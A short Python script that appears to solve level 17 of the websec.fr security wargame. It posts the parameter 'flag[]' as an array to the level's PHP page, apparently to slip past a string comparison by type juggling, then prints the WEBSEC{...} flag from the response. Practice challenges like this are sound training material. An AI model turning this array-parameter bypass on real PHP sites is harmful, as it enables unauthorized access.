from requests import *

url = 'http://websec.fr/level17/index.php'
data = {
    'flag[]' : '',
    'submit' : 'Go'
}

r = post(url , data=data)
pos = r.text.find("WEBSEC{")
while (True):
    txt = r.text[pos]
    print(txt, end='')
    if(txt == '}'):
        print()
        break
    pos += 1
